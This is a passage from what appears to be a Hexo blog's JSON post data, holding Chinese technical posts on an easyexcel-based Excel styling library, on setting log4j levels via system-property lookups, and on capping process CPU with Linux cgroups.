format = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br><span class=\"line\">    private Date date;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getPr1() &#123;</span><br><span class=\"line\">        return pr1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPr1(String pr1) &#123;</span><br><span class=\"line\">        this.pr1 = pr1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getPr2() &#123;</span><br><span class=\"line\">        return pr2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPr2(String pr2) &#123;</span><br><span class=\"line\">        this.pr2 = pr2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getPropValue1() &#123;</span><br><span class=\"line\">        return propValue1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPropValue1(String propValue1) &#123;</span><br><span class=\"line\">        this.propValue1 = propValue1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getPropValue2() &#123;</span><br><span class=\"line\">        return propValue2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPropValue2(String propValue2) &#123;</span><br><span class=\"line\">        this.propValue2 = propValue2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Integer getScore() &#123;</span><br><span class=\"line\">        return score;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setScore(Integer score) &#123;</span><br><span class=\"line\">        this.score = score;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Date getDate() &#123;</span><br><span class=\"line\">        return date;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setDate(Date date) &#123;</span><br><span class=\"line\">        this.date = date;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>详细代码戳下方链接<br><a href=\"https://github.com/Uetty/common-excel\" target=\"_blank\" rel=\"noopener\">仓库主页</a></p>\n<p><a href=\"https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/withhead/TestWithHeadModel.java\" target=\"_blank\" rel=\"noopener\">有标题头demo</a></p>\n<p><a href=\"https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel1.java\" target=\"_blank\" rel=\"noopener\">无标题头demo1</a></p>\n<p><a href=\"https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel2.java\" target=\"_blank\" rel=\"noopener\">无标题头demo2</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>现在是第一版common-excel，基于<code>alibaba/easyexcel</code>依赖进行样式扩展封装而来的，增加了一些样式注解</p>\n<h2 id=\"可以解决什么问题\"><a href=\"#可以解决什么问题\" class=\"headerlink\" title=\"可以解决什么问题\"></a>可以解决什么问题</h2><ol>\n<li>注解式样式</li>\n<li>代码方式自定义样式</li>\n<li>冻结行列样式</li>\n<li>合并单元格样式</li>\n<li>设置内容下拉框</li>\n<li>背景颜色</li>\n<li>字体设置</li>\n<li>列宽度设置</li>\n<li>边框样式</li>\n<li>居中方式</li>\n<li>是否换行</li>\n</ol>\n<h2 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h2><p><img src=\"../static/MB19073101-1.png\" alt=\"img - 1\"> </p>\n<p><img src=\"../static/MB19073101-2.png\" alt=\"img - 2\"> </p>\n<h2 id=\"DEMO\"><a href=\"#DEMO\" class=\"headerlink\" title=\"DEMO\"></a>DEMO</h2><p>model代码示例</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">@CellFreeze(freezeRow = 2, freezeCol = 2)</span><br><span class=\"line\">// 宽度默认值</span><br><span class=\"line\">@ColumnWidth(width = 40)</span><br><span class=\"line\">// 同时作用于表标题和内容的样式默认值</span><br><span class=\"line\">@CellStyle(fontStyle = @FontStyle(color = IndexedColors.LIGHT_BLUE, size = 14))</span><br><span class=\"line\">public class MyModel1 extends BaseRowModel &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    // easyexcel 解析注解</span><br><span class=\"line\">    @ExcelProperty(value=&#123;&quot;pri&quot;, &quot;pr1&quot;&#125;, index = 0)</span><br><span class=\"line\">    private String pr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value=&#123;&quot;pri&quot;, &quot;pr2&quot;&#125;, index = 1)</span><br><span class=\"line\">    private String pr2;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value = &#123;&quot;propValue1&quot;&#125;, index = 2)</span><br><span class=\"line\">    // 数组方式指定的下拉框约束</span><br><span class=\"line\">    @ExplicitConstraint(source = &#123;&quot;aaa1&quot;, &quot;aaa2&quot;, &quot;aaa3&quot;&#125;)</span><br><span class=\"line\">    @ColumnWidth(width = 100)</span><br><span class=\"line\">    private String propValue1;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value = &#123;&quot;propValue2&quot;&#125;, index = 3)</span><br><span class=\"line\">    @ExplicitConstraint(enumSource = MyConstraintEnum.class)</span><br><span class=\"line\">    private String propValue2;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value = &#123;&quot;score&quot;&#125;, index = 4)</span><br><span class=\"line\">    @ColumnWidth(width = 50)</span><br><span class=\"line\">    private Integer score;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value = &#123;&quot;date&quot;&#125;, index = 5, format = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br><span class=\"line\">    private Date date;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getPr1() &#123;</span><br><span class=\"line\">        return pr1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPr1(String pr1) &#123;</span><br><span class=\"line\">        this.pr1 = pr1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getPr2() &#123;</span><br><span class=\"line\">        return pr2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPr2(String pr2) &#123;</span><br><span class=\"line\">        this.pr2 = pr2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getPropValue1() &#123;</span><br><span class=\"line\">        return propValue1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPropValue1(String propValue1) &#123;</span><br><span class=\"line\">        this.propValue1 = propValue1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getPropValue2() &#123;</span><br><span class=\"line\">        return propValue2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setPropValue2(String propValue2) &#123;</span><br><span class=\"line\">        this.propValue2 = propValue2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Integer getScore() &#123;</span><br><span class=\"line\">        return score;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setScore(Integer score) &#123;</span><br><span class=\"line\">        this.score = score;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public Date getDate() &#123;</span><br><span class=\"line\">        return date;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void setDate(Date date) &#123;</span><br><span class=\"line\">        this.date = date;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>详细代码戳下方链接<br><a href=\"https://github.com/Uetty/common-excel\" target=\"_blank\" rel=\"noopener\">仓库主页</a></p>\n<p><a href=\"https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/withhead/TestWithHeadModel.java\" target=\"_blank\" rel=\"noopener\">有标题头demo</a></p>\n<p><a href=\"https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel1.java\" target=\"_blank\" rel=\"noopener\">无标题头demo1</a></p>\n<p><a href=\"https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel2.java\" target=\"_blank\" rel=\"noopener\">无标题头demo2</a></p>\n"},{"title":"log4j xml配置文件个人配置如何不污染GIT远程仓库","date":"2019-08-15T14:36:07.000Z","keywords":"log4j, properties, 小技巧","rId":"MB-19081501","_content":"\n在spring中通常使用xml方式配置log4j。通常开发人员根据自身习惯会在本地开发环境设置令自己舒适的日志打印级别，然而在团队合作编程中，常因配置文件误提交导致污染GIT远程仓库。\n\n针对这个问题，这里分享一个小经验——借助命令行参数在不改变文件的情况下，使配置更加的舒适\n\n## 使用\n1. 首先修改xml配置文件的参数为`${}`形式，如\n```\n<logger name=\"com.xxx.dao\" level=\"${sys:log4j.level.dao:-WARN}\" additivity=\"false\">\n    <appender-ref ref=\"CONSOLE\"/>\n</logger>\n```\n2. 运行命令添加参数值设置自己的习惯级别，IDEA为例在`VM options`后补加一个变量`log4j.level.dao`的参数设定\n```\n-Dlog4j.level.dao=debug\n```\n此时，使用配置了该参数的启动项启动日志级别即为debug级别\n\n## 说明\n实际上，添加VM options参数的方式，不止适用于这里，同样适用于覆盖已有的properties文件、yml文件的配置，只是log4j比较特殊，这里特意写篇博客单独记述。\n在log4j中，`${}`的使用方式与其他地方有所不同\n1. log4j中的`${}`并不能识别项目的properties文件的内容\n2. log4j中的`${}`属性引用格式与其他地方不同，下面具体解释\n\n在log4j中，`${}`参数`sys:log4j.level.dao:-WARN`中，`sys`表示使用`SystemPropertiesLookup`转化参数，`:`和`:-`之间表示属性名，`:-`之后表示默认值。`Lookup`的类型可在`org.apache.logging.log4j.core.lookup.Interpolator#Interpolator(java.util.Map<java.lang.String,java.lang.String>)`中看到，有多个不同的lookup。\n\n去官网转了一圈，也有看到lookup使用的相关介绍[链接](https://logging.apache.org/log4j/2.x/manual/lookups.html#SystemPropertiesLookup)，但说实话，没看过源码的话可能不是很好理解，所以最好还是稍微阅读一下源码\n\n题外话，看了log4j部分源码，实际上log4j获取默认配置文件地址的源码位于`org.apache.logging.log4j.core.config.ConfigurationFactory.Factory#getConfiguration(boolean, java.lang.String)`","source":"_posts/2019-08-15_LOG4J.md","raw":"---\ntitle: log4j xml配置文件个人配置如何不污染GIT远程仓库\ndate: 2019-08-15 22:36:07\ntags: log4j\npermalink: log4j\nkeywords: log4j, properties, 小技巧\nrId: MB-19081501\n---\n\n在spring中通常使用xml方式配置log4j。通常开发人员根据自身习惯会在本地开发环境设置令自己舒适的日志打印级别，然而在团队合作编程中，常因配置文件误提交导致污染GIT远程仓库。\n\n针对这个问题，这里分享一个小经验——借助命令行参数在不改变文件的情况下，使配置更加的舒适\n\n## 使用\n1. 首先修改xml配置文件的参数为`${}`形式，如\n```\n<logger name=\"com.xxx.dao\" level=\"${sys:log4j.level.dao:-WARN}\" additivity=\"false\">\n    <appender-ref ref=\"CONSOLE\"/>\n</logger>\n```\n2. 运行命令添加参数值设置自己的习惯级别，IDEA为例在`VM options`后补加一个变量`log4j.level.dao`的参数设定\n```\n-Dlog4j.level.dao=debug\n```\n此时，使用配置了该参数的启动项启动日志级别即为debug级别\n\n## 说明\n实际上，添加VM options参数的方式，不止适用于这里，同样适用于覆盖已有的properties文件、yml文件的配置，只是log4j比较特殊，这里特意写篇博客单独记述。\n在log4j中，`${}`的使用方式与其他地方有所不同\n1. log4j中的`${}`并不能识别项目的properties文件的内容\n2. log4j中的`${}`属性引用格式与其他地方不同，下面具体解释\n\n在log4j中，`${}`参数`sys:log4j.level.dao:-WARN`中，`sys`表示使用`SystemPropertiesLookup`转化参数，`:`和`:-`之间表示属性名，`:-`之后表示默认值。`Lookup`的类型可在`org.apache.logging.log4j.core.lookup.Interpolator#Interpolator(java.util.Map<java.lang.String,java.lang.String>)`中看到，有多个不同的lookup。\n\n去官网转了一圈，也有看到lookup使用的相关介绍[链接](https://logging.apache.org/log4j/2.x/manual/lookups.html#SystemPropertiesLookup)，但说实话，没看过源码的话可能不是很好理解，所以最好还是稍微阅读一下源码\n\n题外话，看了log4j部分源码，实际上log4j获取默认配置文件地址的源码位于`org.apache.logging.log4j.core.config.ConfigurationFactory.Factory#getConfiguration(boolean, java.lang.String)`","slug":"log4j","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi06i001qg0uk62ih4sof","content":"<p>在spring中通常使用xml方式配置log4j。通常开发人员根据自身习惯会在本地开发环境设置令自己舒适的日志打印级别，然而在团队合作编程中，常因配置文件误提交导致污染GIT远程仓库。</p>\n<p>针对这个问题，这里分享一个小经验——借助命令行参数在不改变文件的情况下，使配置更加的舒适</p>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><ol>\n<li><p>首先修改xml配置文件的参数为<code>${}</code>形式，如</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;logger name=&quot;com.xxx.dao&quot; level=&quot;$&#123;sys:log4j.level.dao:-WARN&#125;&quot; additivity=&quot;false&quot;&gt;</span><br><span class=\"line\">    &lt;appender-ref ref=&quot;CONSOLE&quot;/&gt;</span><br><span class=\"line\">&lt;/logger&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>运行命令添加参数值设置自己的习惯级别，IDEA为例在<code>VM options</code>后补加一个变量<code>log4j.level.dao</code>的参数设定</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-Dlog4j.level.dao=debug</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>此时，使用配置了该参数的启动项启动日志级别即为debug级别</p>\n<h2 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h2><p>实际上，添加VM options参数的方式，不止适用于这里，同样适用于覆盖已有的properties文件、yml文件的配置，只是log4j比较特殊，这里特意写篇博客单独记述。<br>在log4j中，<code>${}</code>的使用方式与其他地方有所不同</p>\n<ol>\n<li>log4j中的<code>${}</code>并不能识别项目的properties文件的内容</li>\n<li>log4j中的<code>${}</code>属性引用格式与其他地方不同，下面具体解释</li>\n</ol>\n<p>在log4j中，<code>${}</code>参数<code>sys:log4j.level.dao:-WARN</code>中，<code>sys</code>表示使用<code>SystemPropertiesLookup</code>转化参数，<code>:</code>和<code>:-</code>之间表示属性名，<code>:-</code>之后表示默认值。<code>Lookup</code>的类型可在<code>org.apache.logging.log4j.core.lookup.Interpolator#Interpolator(java.util.Map&lt;java.lang.String,java.lang.String&gt;)</code>中看到，有多个不同的lookup。</p>\n<p>去官网转了一圈，也有看到lookup使用的相关介绍<a href=\"https://logging.apache.org/log4j/2.x/manual/lookups.html#SystemPropertiesLookup\" target=\"_blank\" rel=\"noopener\">链接</a>，但说实话，没看过源码的话可能不是很好理解，所以最好还是稍微阅读一下源码</p>\n<p>题外话，看了log4j部分源码，实际上log4j获取默认配置文件地址的源码位于<code>org.apache.logging.log4j.core.config.ConfigurationFactory.Factory#getConfiguration(boolean, java.lang.String)</code></p>\n","site":{"data":{}},"excerpt":"","more":"<p>在spring中通常使用xml方式配置log4j。通常开发人员根据自身习惯会在本地开发环境设置令自己舒适的日志打印级别，然而在团队合作编程中，常因配置文件误提交导致污染GIT远程仓库。</p>\n<p>针对这个问题，这里分享一个小经验——借助命令行参数在不改变文件的情况下，使配置更加的舒适</p>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><ol>\n<li><p>首先修改xml配置文件的参数为<code>${}</code>形式，如</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;logger name=&quot;com.xxx.dao&quot; level=&quot;$&#123;sys:log4j.level.dao:-WARN&#125;&quot; additivity=&quot;false&quot;&gt;</span><br><span class=\"line\">    &lt;appender-ref ref=&quot;CONSOLE&quot;/&gt;</span><br><span class=\"line\">&lt;/logger&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>运行命令添加参数值设置自己的习惯级别，IDEA为例在<code>VM options</code>后补加一个变量<code>log4j.level.dao</code>的参数设定</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-Dlog4j.level.dao=debug</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<p>此时，使用配置了该参数的启动项启动日志级别即为debug级别</p>\n<h2 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h2><p>实际上，添加VM options参数的方式，不止适用于这里，同样适用于覆盖已有的properties文件、yml文件的配置，只是log4j比较特殊，这里特意写篇博客单独记述。<br>在log4j中，<code>${}</code>的使用方式与其他地方有所不同</p>\n<ol>\n<li>log4j中的<code>${}</code>并不能识别项目的properties文件的内容</li>\n<li>log4j中的<code>${}</code>属性引用格式与其他地方不同，下面具体解释</li>\n</ol>\n<p>在log4j中，<code>${}</code>参数<code>sys:log4j.level.dao:-WARN</code>中，<code>sys</code>表示使用<code>SystemPropertiesLookup</code>转化参数，<code>:</code>和<code>:-</code>之间表示属性名，<code>:-</code>之后表示默认值。<code>Lookup</code>的类型可在<code>org.apache.logging.log4j.core.lookup.Interpolator#Interpolator(java.util.Map&lt;java.lang.String,java.lang.String&gt;)</code>中看到，有多个不同的lookup。</p>\n<p>去官网转了一圈，也有看到lookup使用的相关介绍<a href=\"https://logging.apache.org/log4j/2.x/manual/lookups.html#SystemPropertiesLookup\" target=\"_blank\" rel=\"noopener\">链接</a>，但说实话，没看过源码的话可能不是很好理解，所以最好还是稍微阅读一下源码</p>\n<p>题外话，看了log4j部分源码，实际上log4j获取默认配置文件地址的源码位于<code>org.apache.logging.log4j.core.config.ConfigurationFactory.Factory#getConfiguration(boolean, java.lang.String)</code></p>\n"},{"title":"Linux限制进程CPU上限","date":"2019-11-25T11:20:11.000Z","keywords":"linux, 限制cpu使用率","rId":"MB-19112501","_content":"\n要实现linux限制进程上限的功能，需要用到Cgroups技术，它的全程Linux Control Group，用于限制一个进程组能够使用的资源（CPU、内存、磁盘、网络带宽）上限，还能够对进程进行优先级设置，以及进行将进程挂起恢复的操作。\n\nCgroups给用户暴露出来的操作接口是文件系统，以目录和文件的方式组织在`/sys/fs/cgroup`路径下。\n\n执行`ls /sys/fs/cgroup`命令可以看到如下文件列表\n\n```\nroot@ubuntu:$ ls /sys/fs/cgroup\nblkio  cpuacct      cpuset   freezer  memory   net_cls,net_prio  perf_event  rdma     unified\ncpu    cpu,cpuacct  devices  hugetlb  net_cls  net_prio          pids        systemd\n```\n\n代表了可操作的各种资源\n\n以cpu资源为例，查看`cpu`目录，执行`ls /sys/fs/cgroup/cpu`可以看到如下列表\n\n```\nroot@ubuntu:$ ls /sys/fs/cgroup/cpu\ncgroup.clone_children  cpuacct.usage_all          cpuacct.usage_user  notify_on_release  user.slice\ncgroup.procs           cpuacct.usage_percpu       cpu.cfs_period_us   release_agent\ncgroup.sane_behavior   cpuacct.usage_percpu_sys   cpu.cfs_quota_us    system.slice\ncpuacct.stat           cpuacct.usage_percpu_user  cpu.shares          tasks\ncpuacct.usage          cpuacct.usage_sys          cpu.stat\n```\n\n其中`tasks`文件列出了受限制的进程pid列表，`cpu.cfs_period_us`和`cpu.cfs_quota_us`文件搭配使用可以达到限制cpu使用率的目的，打开两个文件分别看到内容如下\n\n`cpu.cfs_period_us`\n\n```100000\n100000\n```\n\n`cpu.cfs_quota_us`\n\n```\n-1\n```\n\n表示100000us时间内不限制分配的cpu时间长度（-1表示不限制，如果将-1换成30000则表示允许分配30000us即30ms的cpu时间）\n\n\n\n## 实践一下\n\ncgroup是树型结构的，可以在当前树下新建子节点，根目录`/sys/fs/cgroup/cpu`一般表示整个计算机。所以我们不是直接操作`/sys/fs/cgroup/cpu`下面的文件，而是在目录树下创建一个名为`test`的子目录，查看目录可以发现操作系统会在新建的`test`目录下自动生成了该系统对应的资源限制文件\n\n```\nroot@ubuntu:$ cd /sys/fs/cgroup/cpu\nroot@ubuntu:/sys/fs/cgroup/cpu$ mkdir test\nroot@ubuntu:/sys/fs/cgroup/cpu$ cd test\nroot@ubuntu:/sys/fs/cgroup/cpu$ \nroot@ubuntu:/sys/fs/cgroup/cpu/test$ ls\ncgroup.clone_children  cpuacct.usage         cpuacct.usage_percpu_sys   cpuacct.usage_user  cpu.shares         tasks\ncgroup.procs           cpuacct.usage_all     cpuacct.usage_percpu_user  cpu.cfs_period_us   cpu.stat\ncpuacct.stat           cpuacct.usage_percpu  cpuacct.usage_sys          cpu.cfs_quota_us    notify_on_release\n```\n\n接下来，先启动两个用于测试的死循环进程，进程号分别为15007和15952\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &\n[1] 15007\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &\n[2] 15952\n```\n\n查看此时的cpu使用情况，cpu使用率达到了93.8%\n\n```\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND\n15952 root      20   0   22776   2960   1212 R 50.0  0.1  18:18.90 bash\n15007 root      20   0   22776   1684      0 R 43.8  0.1  24:04.92 bash\n```\n\n修改`cpu.cfs_quota_us`文件和`tasks`文件\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ echo \"40000\" > cpu.cfs_quota_us\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e \"15007\\n15952\" > tasks\n```\n\n查看此时的cpu使用情况，发现cpu使用率成功降下来了\n\n```\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND\n15952 root      20   0   22776   2960   1212 R 20.3  0.1  20:04.56 bash\n15007 root      20   0   22776   1684      0 R 19.9  0.1  25:50.57 bash\n```\n\n### 添加限制的进程\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e \"1234\" > tasks\n```\n\n虽然上面写文件使用的符号是单大于号`>`，但实际上并不会覆盖原本文件，实际效果是添加一个pid为1234的进程到该cgroup组中\n\n### 移除进程限制\n\n在cgroup数中，一个进程必须属于一个cgroup，所以不能从一个cgroup凭空删除一个进程，只能将进程移动到其他cgroup节点，所以删除操作也便成为了将进程移动到cgroup树的根节点\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ echo \"15007\" > ../tasks\n```\n\n### 删除cgroup组\n\n删除cgroup文件夹即可，但这里使用`rm -rf test`是行不通的，需要使用`rmdir`命令。（删除时需确保cgroup组中没有进程存在）\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu$ rmdir test\n```\n\n","source":"_posts/2019-11-25_Linux_Cgroup.md","raw":"---\ntitle: Linux限制进程CPU上限\ndate: 2019-11-25 19:20:11\ntags: linux\npermalink: linux-cgroup-cpu\nkeywords: linux, 限制cpu使用率\nrId: MB-19112501\n---\n\n要实现linux限制进程上限的功能，需要用到Cgroups技术，它的全程Linux Control Group，用于限制一个进程组能够使用的资源（CPU、内存、磁盘、网络带宽）上限，还能够对进程进行优先级设置，以及进行将进程挂起恢复的操作。\n\nCgroups给用户暴露出来的操作接口是文件系统，以目录和文件的方式组织在`/sys/fs/cgroup`路径下。\n\n执行`ls /sys/fs/cgroup`命令可以看到如下文件列表\n\n```\nroot@ubuntu:$ ls /sys/fs/cgroup\nblkio  cpuacct      cpuset   freezer  memory   net_cls,net_prio  perf_event  rdma     unified\ncpu    cpu,cpuacct  devices  hugetlb  net_cls  net_prio          pids        systemd\n```\n\n代表了可操作的各种资源\n\n以cpu资源为例，查看`cpu`目录，执行`ls /sys/fs/cgroup/cpu`可以看到如下列表\n\n```\nroot@ubuntu:$ ls /sys/fs/cgroup/cpu\ncgroup.clone_children  cpuacct.usage_all          cpuacct.usage_user  notify_on_release  user.slice\ncgroup.procs           cpuacct.usage_percpu       cpu.cfs_period_us   release_agent\ncgroup.sane_behavior   cpuacct.usage_percpu_sys   cpu.cfs_quota_us    system.slice\ncpuacct.stat           cpuacct.usage_percpu_user  cpu.shares          tasks\ncpuacct.usage          cpuacct.usage_sys          cpu.stat\n```\n\n其中`tasks`文件列出了受限制的进程pid列表，`cpu.cfs_period_us`和`cpu.cfs_quota_us`文件搭配使用可以达到限制cpu使用率的目的，打开两个文件分别看到内容如下\n\n`cpu.cfs_period_us`\n\n```100000\n100000\n```\n\n`cpu.cfs_quota_us`\n\n```\n-1\n```\n\n表示100000us时间内不限制分配的cpu时间长度（-1表示不限制，如果将-1换成30000则表示允许分配30000us即30ms的cpu时间）\n\n\n\n## 实践一下\n\ncgroup是树型结构的，可以在当前树下新建子节点，根目录`/sys/fs/cgroup/cpu`一般表示整个计算机。所以我们不是直接操作`/sys/fs/cgroup/cpu`下面的文件，而是在目录树下创建一个名为`test`的子目录，查看目录可以发现操作系统会在新建的`test`目录下自动生成了该系统对应的资源限制文件\n\n```\nroot@ubuntu:$ cd /sys/fs/cgroup/cpu\nroot@ubuntu:/sys/fs/cgroup/cpu$ mkdir test\nroot@ubuntu:/sys/fs/cgroup/cpu$ cd test\nroot@ubuntu:/sys/fs/cgroup/cpu$ \nroot@ubuntu:/sys/fs/cgroup/cpu/test$ ls\ncgroup.clone_children  cpuacct.usage         cpuacct.usage_percpu_sys   cpuacct.usage_user  cpu.shares         tasks\ncgroup.procs           cpuacct.usage_all     cpuacct.usage_percpu_user  cpu.cfs_period_us   cpu.stat\ncpuacct.stat           cpuacct.usage_percpu  cpuacct.usage_sys          cpu.cfs_quota_us    notify_on_release\n```\n\n接下来，先启动两个用于测试的死循环进程，进程号分别为15007和15952\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &\n[1] 15007\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ while : ; do : ; done &\n[2] 15952\n```\n\n查看此时的cpu使用情况，cpu使用率达到了93.8%\n\n```\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND\n15952 root      20   0   22776   2960   1212 R 50.0  0.1  18:18.90 bash\n15007 root      20   0   22776   1684      0 R 43.8  0.1  24:04.92 bash\n```\n\n修改`cpu.cfs_quota_us`文件和`tasks`文件\n\n```\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ echo \"40000\" > cpu.cfs_quota_us\nroot@ubuntu:/sys/fs/cgroup/cpu/test$ echo -e \"15007\\n15952\" > tasks\n```\n\n查看此时的cpu使用情况，发现cpu使用率成功降下来了\n\n```\n  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND\n15952 root      20   0   22776   2960   1212 R 20.3  0.1  20:04.56 bash\n15007 root      20   0   22776   1684      0 R 19.9  0.1  25:50.57 bash\n```\n\n### 